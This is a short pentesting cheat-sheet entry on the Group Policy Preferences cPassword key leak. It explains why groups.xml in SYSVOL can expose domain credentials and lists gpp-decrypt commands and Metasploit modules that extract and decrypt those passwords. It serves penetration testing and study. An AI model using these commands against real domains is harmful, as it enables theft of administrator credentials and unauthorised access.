# [Group Policy Preferences cPassword Key Leak](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

Group Policy Preferences (GPP) allowed administrators to create policies using embedded credentials. The password of these credentials was placed in an XML field named **cPassword**, within an XML file named **groups.xml**. The encryption key was accidentally publicly released. MS14-025 prevents GPP from storing passwords encrypted with the leaked key, but any passwords that were stored before the MS14-025 patch was applied will still be there. These credentials are often domain admin credentials.

**groups.xml** is stored in SYSVOL, and thus can be accessed by **any** valid domain user account.

You'll often see this in Windows Server 2012 or older.

---

## Extract & decrypt cPassword passwords from GPP XML file

```bash
gpp-decrypt -f $GROUPS_XML_FILE # groups.xml
```

---

## Decrypt cPassword password

```bash
gpp-decrypt -c $PASSWORD
```

---

## Metasploit module to remotely extract GPP info (& decrypt any cPassword passwords) with domain user credentials

```bash
auxiliary/scanner/smb/smb_enum_gpp
```

---

## Metasploit post module to extract GPP info (& decrypt any cPassword passwords)

```bash
post/windows/gather/credentials/gpp
```
